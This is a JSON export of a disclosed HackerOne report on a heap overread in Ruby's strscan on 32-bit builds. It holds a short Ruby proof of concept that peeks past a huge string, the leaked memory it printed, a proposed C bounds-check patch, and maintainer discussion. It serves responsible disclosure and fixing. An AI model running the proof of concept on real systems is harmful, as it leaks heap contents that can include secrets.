{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-11-16T10:08:50.689Z", 
    "voters": [
        "michiel", 
        "supernatural", 
        "eveeez", 
        "madrobot", 
        "guido", 
        "mpz", 
        "ajdumanhug", 
        "cuso4", 
        "spetr0x", 
        "the_phantom_kangaroo", 
        "and 7 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "200.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 166661, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-11-17T00:30:21.452Z", 
    "vulnerability_information": "```ruby\nrequire 'strscan'\nx = 'x' * 0x7FFFFFFE\ns = StringScanner.new(x)\ns.pos = 0x7FFFFFFD\nt = s.peek(40000)\nt.each_byte do |i|\n\tif i != 0\n\t\tprint i.chr\n\tend\nend\n```\n\nRun:\n\n```sh\n./ruby r.rb | strings\n```\n\nMy output:\n\n```\n@\t;>@V`TdBE\n__gmon_start___fini_ITM_deregisterTMCloneTable_ITM_registerTMCloneTable__cxa_finalize_Jv_RegisterClassesonig_region_memsizeonig_region_freeruby_xfreerb_gc_markrb_check_typeddatarb_num2longrb_eRangeErrorrb_raiserb_int2bigrb_eArgErrorrb_string_valuerb_reg_region_copyrb_memerrorrb_scan_argsrb_data_typed_object_zalloconig_region_initrb_str_newrb_str_dumprb_str_new_staticrb_str_catrb_funcallrb_str_lengthrb_str_appendrb_warningrb_enc_copyrb_sym2strrb_enc_getonig_name_to_backref_numberrb_eIndexErrorrb_enc_raiseonig_region_clearonig_region_setrb_enc_mbclenrb_check_typerb_reg_prepare_reonig_matchonig_freeonig_searchrb_obj_classrb_sprintfInit_strscanrb_cObjectrb_define_classrb_eStandardErrorrb_define_class_underrb_const_definedrb_obj_freezerb_const_setrb_define_alloc_funcrb_define_private_methodrb_define_singleton_methodrb_define_methodrb_intern2rb_aliaslibpthread.so.0libdl.so.2libcrypt.so.1libm.so.6libc.so.6_edata__bss_start_endGLIBC_2.1.3\n@xh[\nD$ P\nUWVS\n[^_]\n&UWVS\n[^_]\nt&WVS\nt&VS\n'WVS\nD$ P\nt&UWVS\n[^_]\n;|$0|\nL$0)\n;|$0|\nL$0)\n'UWVS\nl$<P\n[^_]\n~`9G\n[^_]\nPjjW\nvWVS\nPjjW\nt&WVS\nPjjW\nvUWVS\n[^_]\nvUWVS\n|$@P\n[^_]\n'UWVS\n|$<j\n[^_]\n~$RW\nQRQU\n&UWVS\n|$<j\n[^_]\n~$RW\nRPRPU\nUWVS\n|$<j\n[^_]\n~$RW\nQRQU\n[^_]\nUWVS\n|$<j\n[^_]\n~$RW\nRPRPU\n&UWVS\n|$<j\n[^_]\n~$RW\nRPRPU\n[^_]\n&UWVS\n|$<j\n[^_]\n~$RW\nQRQU\n'UWVS\n|$<j\n[^_]\n~$RW\nQRQU\nUWVS\n|$<j\n[^_]\n~$RW\nRPRPU\nUWVS\n|$<j\n[^_]\n~$RW\nRPRPU\nUWVS\n|$<j\n[^_]\n~$RW\nQRQU\nt&UWVS\n|$<P\n[^_]\n'UWVS\n[^_]\n&UWVS\n[^_]\nvWVS\n^j/P\n jPW\n [^_\nuninitialized StringScanner objectunscan failed: previous match record not existStringScanner#clear is obsolete; use #terminate insteadStringScanner#restsize is obsolete; use #rest_size insteadundefined group name reference: %.*sStringScanner#getbyte is obsolete; use #get_byte insteadStringScanner#peep is obsolete; use #peek insteadStringScanner#empty? is obsolete; use #eos? instead$Id: strscan.c 52988 2015-12-09 01:01:17Z ko1 $index out of range11...regexp buffer overflow#<%li\n (uninitialized)>#<%li\n fin>#<%li\n %ld/%ld @ %li\n>#<%li\n %ld/%ld %li\n @ %li\n>ScanErrorbytesliceStringScanner0.7.0VersionIdinitializeinitialize_copymust_C_versionresetterminateclearstringstring=concat<<pos=charpospointerpointer=skipmatch?checkscan_fullscan_untilskip_untilexist?check_untilsearch_fullgetchget_bytegetbytepeekpeepunscanbeginning_of_line?bol?eos?empty?rest?matched?matchedmatched_size[]pre_matchpost_matchrestrest_sizerestsizeinspect\n;*2$\"\n pH\tp\nvGCC: (Debian 4.9.2-10) 4.9.2\n^<\t M\nPF\tY\nH\t$M\n)d\tnW\n4,\t'b\n@\t;y\n^P\t(\n^T\t`\n^X\t]\n\\\tg2\n\t\t6%\n^<\t M\nPF\tY\nH\t$M\n)d\tnW\n4,\t'b\n@\t;y\n^P\t(\n^T\t`\n^X\t]\n\\\tg2\n\t\t6%\n```\n\nProposed patch is as follows. Note that I avoid the easy way of checking for overflow ie.\n```c\nbeg_i + len < beg_i\n```\n\nsince that implies a signed integer overflow which is officially undefined behavior in C and reportedly may lead to unexpected results on some architectures. But feel free to implement a patch however you want.\n\n```diff\ndiff --git a/ext/strscan/strscan.c b/ext/strscan/strscan.c\nindex 9b52fea..7dfe17a 100644\n--- a/ext/strscan/strscan.c\n+++ b/ext/strscan/strscan.c\n@@ -153,7 +153,7 @@ static VALUE\n extract_beg_len(struct strscanner *p, long beg_i, long len)\n {\n     if (beg_i > S_LEN(p)) return Qnil;\n-    if (beg_i + len > S_LEN(p))\n+    if (len < 0 || beg_i > (LONG_MAX - len) || beg_i + len > S_LEN(p))\n         len = S_LEN(p) - beg_i;\n     return infect(str_new(p, S_PBEG(p) + beg_i, len), p);\n }\n```\n\nNote that malice isn't necessarily required to trigger this vulnerability; any Ruby program that uses strscan to simply operate on large buffers may unknowingly exfiltrate secret data (if the peek()'d data ever leaves the system).\n\nThe vulnerability is not expected to work on 64 bit systems because of the much larger limits of the ```long``` type, and the requirement that the sizes of the buffers and available heap memory are accordingly large.\n\nTested on ruby-2.3.1 ", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "low", 
        "author_type": "Team"
    }, 
    "title": "Arbitrary heap overread in strscan on 32 bit Ruby, patch included", 
    "is_member_of_team?": null, 
    "vote_count": 17, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-12-16T10:08:50.718Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$200", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-09-08T06:18:15.223Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-08T06:18:15.223Z", 
            "actor": {
                "username": "nobu", 
                "url": "/nobu", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/083/585/348a05c379e6d3debcf396f1393a13eeffdd04df_medium.jpeg?1466097900"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "Confirmed.\nI think the condition can be:\n\n~~~C\n    if (len > S_LEN(p) - beg_i)\n        len = S_LEN(p) - beg_i;\n~~~", 
            "markdown_message": "<p>Confirmed.<br>\nI think the condition can be:</p>\n<pre class=\"highlight plaintext\"><code>    if (len &gt; S_LEN(p) - beg_i)\n        len = S_LEN(p) - beg_i;\n</code></pre>", 
            "type": "Activities::Comment", 
            "id": 1181700, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-08T12:48:13.136Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-08T12:48:13.136Z", 
            "actor": {
                "username": "guido", 
                "url": "/guido", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/983/055f2e31c3b25e230eeb37461df974006ba7b0bd_medium.jpg?1403536399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "str_new0 will catch negative values so you are right.\n\nThis might also be vulnerable:\n```\n 719 static VALUE\n 720 strscan_getch(VALUE self)\n 721 {\n 722     struct strscanner *p;\n 723     long len;\n 724 \n 725     GET_SCANNER(self, p);\n 726     CLEAR_MATCH_STATUS(p);\n 727     if (EOS_P(p))\n 728         return Qnil;\n 729 \n 730     len = rb_enc_mbclen(CURPTR(p), S_PEND(p), rb_enc_get(p->str));\n 731     if (p->curr + len > S_LEN(p)) {                                                                                                                      \n 732         len = S_LEN(p) - p->curr; \n 733     }\n 734     p->prev = p->curr;\n 735     p->curr += len;\n 736     MATCHED(p);\n 737     adjust_registers_to_matched(p);\n 738     return extract_range(p, p->prev + p->regs.beg[0],\n 739                             p->prev + p->regs.end[0]);\n 740 }\n```\n\nI cannot verify it at this very moment. But if it is vulnerable, the bug in this in function has the additional consequence that it will set ```p->curr``` to an OOB position, which may have further ramifications via functions that rely on a correct ```curr`` value.\n\nWill report back on this later.", 
            "markdown_message": "<p>str_new0 will catch negative values so you are right.</p>\n\n<p>This might also be vulnerable:</p>\n<pre class=\"highlight plaintext\"><code> 719 static VALUE\n 720 strscan_getch(VALUE self)\n 721 {\n 722     struct strscanner *p;\n 723     long len;\n 724 \n 725     GET_SCANNER(self, p);\n 726     CLEAR_MATCH_STATUS(p);\n 727     if (EOS_P(p))\n 728         return Qnil;\n 729 \n 730     len = rb_enc_mbclen(CURPTR(p), S_PEND(p), rb_enc_get(p-&gt;str));\n 731     if (p-&gt;curr + len &gt; S_LEN(p)) {                                                                                                                      \n 732         len = S_LEN(p) - p-&gt;curr; \n 733     }\n 734     p-&gt;prev = p-&gt;curr;\n 735     p-&gt;curr += len;\n 736     MATCHED(p);\n 737     adjust_registers_to_matched(p);\n 738     return extract_range(p, p-&gt;prev + p-&gt;regs.beg[0],\n 739                             p-&gt;prev + p-&gt;regs.end[0]);\n 740 }\n</code></pre>\n<p>I cannot verify it at this very moment. But if it is vulnerable, the bug in this in function has the additional consequence that it will set <code>p-&gt;curr</code> to an OOB position, which may have further ramifications via functions that rely on a correct `<code>curr</code> value.</p>\n\n<p>Will report back on this later.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1182202, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-13T08:49:41.379Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-13T08:49:41.379Z", 
            "actor": {
                "username": "guido", 
                "url": "/guido", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/983/055f2e31c3b25e230eeb37461df974006ba7b0bd_medium.jpg?1403536399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "I believe ```getch``` isn't vulnerable since the underlying ```rb_enc_mbclen``` automatically caps the length that it returns to ```end - start```, so even multi-byte encodings like UTF32 won't cause an overflow.\n\nCan you give an estimated time/date of bug resolution and disclosure?\n\nThanks.", 
            "markdown_message": "<p>I believe <code>getch</code> isn&#39;t vulnerable since the underlying <code>rb_enc_mbclen</code> automatically caps the length that it returns to <code>end - start</code>, so even multi-byte encodings like UTF32 won&#39;t cause an overflow.</p>\n\n<p>Can you give an estimated time/date of bug resolution and disclosure?</p>\n\n<p>Thanks.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1190450, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-17T03:00:46.417Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-17T03:00:46.417Z", 
            "actor": {
                "username": "nobu", 
                "url": "/nobu", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/083/585/348a05c379e6d3debcf396f1393a13eeffdd04df_medium.jpeg?1466097900"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "> any Ruby program that uses strscan to simply operate on large buffers may unknowingly exfiltrate secret data (if the peek()'d data ever leaves the system).\n\nIt's doubtful.\nUsing `strscan` with a half of whole memory space is unusual.", 
            "markdown_message": "<blockquote>\n<p>any Ruby program that uses strscan to simply operate on large buffers may unknowingly exfiltrate secret data (if the peek()&#39;d data ever leaves the system).</p>\n</blockquote>\n\n<p>It&#39;s doubtful.<br>\nUsing <code>strscan</code> with a half of whole memory space is unusual.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1201689, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-17T09:11:14.240Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-17T09:11:14.240Z", 
            "actor": {
                "username": "guido", 
                "url": "/guido", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/983/055f2e31c3b25e230eeb37461df974006ba7b0bd_medium.jpg?1403536399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "Alright.\n\nWhen will this be fixed and closed?", 
            "markdown_message": "<p>Alright.</p>\n\n<p>When will this be fixed and closed?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1201869, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-25T20:00:21.500Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-25T20:00:21.500Z", 
            "actor": {
                "username": "guido", 
                "url": "/guido", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/983/055f2e31c3b25e230eeb37461df974006ba7b0bd_medium.jpg?1403536399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "The lack of communication here is disappointing.", 
            "markdown_message": "<p>The lack of communication here is disappointing.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1215154, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-10-13T12:06:22.607Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-13T12:06:22.607Z", 
            "actor": {
                "username": "guido", 
                "url": "/guido", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/983/055f2e31c3b25e230eeb37461df974006ba7b0bd_medium.jpg?1403536399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "Vulnerability was acknowledged and fixed in upstream. Team is completely unresponsive now. All that they need to do is close the bug, so that the IBB can deliberate on a reward.", 
            "markdown_message": "<p>Vulnerability was acknowledged and fixed in upstream. Team is completely unresponsive now. All that they need to do is close the bug, so that the IBB can deliberate on a reward.</p>\n", 
            "type": "Activities::HackerRequestedMediation", 
            "id": 1245708, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-11-16T07:32:54.624Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-16T07:32:54.624Z", 
            "actor": {
                "username": "hsbt", 
                "url": "/hsbt", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_severity": "Low", 
                "old_severity": null
            }, 
            "team_handle": "ruby", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportSeverityUpdated", 
            "id": 1301884, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "guido", 
                "url": "/guido"
            }, 
            "created_at": "2016-11-16T07:33:15.745Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-16T07:33:15.745Z", 
            "actor": {
                "username": "hsbt", 
                "url": "/hsbt", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1301885, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-11-16T10:08:50.703Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-16T10:08:50.703Z", 
            "actor": {
                "username": "guido", 
                "url": "/guido", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/983/055f2e31c3b25e230eeb37461df974006ba7b0bd_medium.jpg?1403536399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1302066, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-11-16T12:45:44.097Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-16T12:45:44.097Z", 
            "actor": {
                "url": "/ruby", 
                "profile": {
                    "name": "Ruby"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/724/0c1556227f51c9b2b13ada11ccd2fb02cc9fa257_medium.png?1449271894"
                }
            }, 
            "team_handle": "ruby", 
            "bounty_amount": "200.0", 
            "collaborator": {
                "username": "guido", 
                "url": "/guido"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 1302350, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-11-16T19:22:08.977Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-16T19:22:08.977Z", 
            "actor": {
                "username": "guido", 
                "url": "/guido", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/983/055f2e31c3b25e230eeb37461df974006ba7b0bd_medium.jpg?1403536399"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "Thanks IBB.", 
            "markdown_message": "<p>Thanks IBB.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1302950, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-11-17T00:30:21.470Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-17T00:30:21.470Z", 
            "actor": {
                "username": "hsbt", 
                "url": "/hsbt", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1303418, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-11-17T00:30:21.509Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-17T00:30:21.509Z", 
            "actor": {
                "username": "hsbt", 
                "url": "/hsbt", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/051/808/a7d4f1d7b3f5de51caf190236c85c70986dc15ff_medium.jpg?1486003618"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1303419, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "guido", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/guido", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/002/983/bc1fffcbbb736a8fa94816a1961b7b76725881eb_small.jpg?1403536399"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 18, 
        "name": "Information Disclosure"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -62253479.749023184, 
    "disclosed_at": "2016-11-17T00:30:21.494Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/166661", 
    "created_at": "2016-09-07T20:12:07.163Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<pre class=\"highlight ruby\"><code><span class=\"nb\">require</span> <span class=\"s1\">&#39;strscan&#39;</span>\n<span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;x&#39;</span> <span class=\"o\">*</span> <span class=\"mh\">0x7FFFFFFE</span>\n<span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"no\">StringScanner</span><span class=\"p\">.</span><span class=\"nf\">new</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">)</span>\n<span class=\"n\">s</span><span class=\"p\">.</span><span class=\"nf\">pos</span> <span class=\"o\">=</span> <span class=\"mh\">0x7FFFFFFD</span>\n<span class=\"n\">t</span> <span class=\"o\">=</span> <span class=\"n\">s</span><span class=\"p\">.</span><span class=\"nf\">peek</span><span class=\"p\">(</span><span class=\"mi\">40000</span><span class=\"p\">)</span>\n<span class=\"n\">t</span><span class=\"p\">.</span><span class=\"nf\">each_byte</span> <span class=\"k\">do</span> <span class=\"o\">|</span><span class=\"n\">i</span><span class=\"o\">|</span>\n    <span class=\"k\">if</span> <span class=\"n\">i</span> <span class=\"o\">!=</span> <span class=\"mi\">0</span>\n        <span class=\"nb\">print</span> <span class=\"n\">i</span><span class=\"p\">.</span><span class=\"nf\">chr</span>\n    <span class=\"k\">end</span>\n<span class=\"k\">end</span>\n</code></pre>\n<p>Run:</p>\n<pre class=\"highlight shell\"><code>./ruby r.rb | strings\n</code></pre>\n<p>My output:</p>\n<pre class=\"highlight plaintext\"><code>@   ;&gt;@V`TdBE\n__gmon_start___fini_ITM_deregisterTMCloneTable_ITM_registerTMCloneTable__cxa_finalize_Jv_RegisterClassesonig_region_memsizeonig_region_freeruby_xfreerb_gc_markrb_check_typeddatarb_num2longrb_eRangeErrorrb_raiserb_int2bigrb_eArgErrorrb_string_valuerb_reg_region_copyrb_memerrorrb_scan_argsrb_data_typed_object_zalloconig_region_initrb_str_newrb_str_dumprb_str_new_staticrb_str_catrb_funcallrb_str_lengthrb_str_appendrb_warningrb_enc_copyrb_sym2strrb_enc_getonig_name_to_backref_numberrb_eIndexErrorrb_enc_raiseonig_region_clearonig_region_setrb_enc_mbclenrb_check_typerb_reg_prepare_reonig_matchonig_freeonig_searchrb_obj_classrb_sprintfInit_strscanrb_cObjectrb_define_classrb_eStandardErrorrb_define_class_underrb_const_definedrb_obj_freezerb_const_setrb_define_alloc_funcrb_define_private_methodrb_define_singleton_methodrb_define_methodrb_intern2rb_aliaslibpthread.so.0libdl.so.2libcrypt.so.1libm.so.6libc.so.6_edata__bss_start_endGLIBC_2.1.3\n[@xh](/xh)[\nD$ P\nUWVS\n[^_]\n&amp;UWVS\n[^_]\nt&amp;WVS\nt&amp;VS\n&#39;WVS\nD$ P\nt&amp;UWVS\n[^_]\n;|$0|\nL$0)\n;|$0|\nL$0)\n&#39;UWVS\nl$&lt;P\n[^_]\n~`9G\n[^_]\nPjjW\nvWVS\nPjjW\nt&amp;WVS\nPjjW\nvUWVS\n[^_]\nvUWVS\n|$@P\n[^_]\n&#39;UWVS\n|$&lt;j\n[^_]\n~$RW\nQRQU\n&amp;UWVS\n|$&lt;j\n[^_]\n~$RW\nRPRPU\nUWVS\n|$&lt;j\n[^_]\n~$RW\nQRQU\n[^_]\nUWVS\n|$&lt;j\n[^_]\n~$RW\nRPRPU\n&amp;UWVS\n|$&lt;j\n[^_]\n~$RW\nRPRPU\n[^_]\n&amp;UWVS\n|$&lt;j\n[^_]\n~$RW\nQRQU\n&#39;UWVS\n|$&lt;j\n[^_]\n~$RW\nQRQU\nUWVS\n|$&lt;j\n[^_]\n~$RW\nRPRPU\nUWVS\n|$&lt;j\n[^_]\n~$RW\nRPRPU\nUWVS\n|$&lt;j\n[^_]\n~$RW\nQRQU\nt&amp;UWVS\n|$&lt;P\n[^_]\n&#39;UWVS\n[^_]\n&amp;UWVS\n[^_]\nvWVS\n^j/P\n jPW\n [^_\nuninitialized StringScanner objectunscan failed: previous match record not existStringScanner#clear is obsolete; use #terminate insteadStringScanner#restsize is obsolete; use #rest_size insteadundefined group name reference: %.*sStringScanner#getbyte is obsolete; use #get_byte insteadStringScanner#peep is obsolete; use #peek insteadStringScanner#empty? is obsolete; use #eos? instead$Id: strscan.c 52988 2015-12-09 01:01:17Z ko1 $index out of range11...regexp buffer overflow#&lt;%li\n (uninitialized)&gt;#&lt;%li\n fin&gt;#&lt;%li\n %ld/%ld @ %li\n&gt;#&lt;%li\n %ld/%ld %li\n @ %li\n&gt;ScanErrorbytesliceStringScanner0.7.0VersionIdinitializeinitialize_copymust_C_versionresetterminateclearstringstring=concat&lt;&lt;pos=charpospointerpointer=skipmatch?checkscan_fullscan_untilskip_untilexist?check_untilsearch_fullgetchget_bytegetbytepeekpeepunscanbeginning_of_line?bol?eos?empty?rest?matched?matchedmatched_size[]pre_matchpost_matchrestrest_sizerestsizeinspect\n;*2$&quot;\n pH p\nvGCC: (Debian 4.9.2-10) 4.9.2\n^&lt;   M\nPF  Y\nH   $M\n)d  nW\n4,  &#39;b\n@   ;y\n^P  (\n^T  `\n^X  ]\n\\   g2\n        6%\n^&lt;   M\nPF  Y\nH   $M\n)d  nW\n4,  &#39;b\n@   ;y\n^P  (\n^T  `\n^X  ]\n\\   g2\n        6%\n</code></pre>\n<p>Proposed patch is as follows. Note that I avoid the easy way of checking for overflow ie.</p>\n<pre class=\"highlight c\"><code><span class=\"n\">beg_i</span> <span class=\"o\">+</span> <span class=\"n\">len</span> <span class=\"o\">&lt;</span> <span class=\"n\">beg_i</span>\n</code></pre>\n<p>since that implies a signed integer overflow which is officially undefined behavior in C and reportedly may lead to unexpected results on some architectures. But feel free to implement a patch however you want.</p>\n<pre class=\"highlight diff\"><code><span class=\"gh\">diff --git a/ext/strscan/strscan.c b/ext/strscan/strscan.c\nindex 9b52fea..7dfe17a 100644\n</span><span class=\"gd\">--- a/ext/strscan/strscan.c\n</span><span class=\"gi\">+++ b/ext/strscan/strscan.c\n</span><span class=\"gu\">@@ -153,7 +153,7 @@ static VALUE\n</span> extract_beg_len(struct strscanner *p, long beg_i, long len)\n {\n     if (beg_i &gt; S_LEN(p)) return Qnil;\n<span class=\"gd\">-    if (beg_i + len &gt; S_LEN(p))\n</span><span class=\"gi\">+    if (len &lt; 0 || beg_i &gt; (LONG_MAX - len) || beg_i + len &gt; S_LEN(p))\n</span>         len = S_LEN(p) - beg_i;\n     return infect(str_new(p, S_PBEG(p) + beg_i, len), p);\n }\n</code></pre>\n<p>Note that malice isn&#39;t necessarily required to trigger this vulnerability; any Ruby program that uses strscan to simply operate on large buffers may unknowingly exfiltrate secret data (if the peek()&#39;d data ever leaves the system).</p>\n\n<p>The vulnerability is not expected to work on 64 bit systems because of the much larger limits of the <code>long</code> type, and the requirement that the sizes of the buffers and available heap memory are accordingly large.</p>\n\n<p>Tested on ruby-2.3.1 </p>\n", 
    "severity_rating": "low", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.ruby-lang.org", 
            "about": "A Programmer's Best Friend", 
            "twitter_handle": "", 
            "name": "Ruby"
        }, 
        "handle": "ruby", 
        "url": "https://hackerone.com/ruby", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/007/724/36e273f967b252ae8b4051d09ffc08f7de16d7d5_small.png?1449271894", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/007/724/0c1556227f51c9b2b13ada11ccd2fb02cc9fa257_medium.png?1449271894"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 7724, 
        "default_currency": "usd"
    }, 
    "is_published": false
}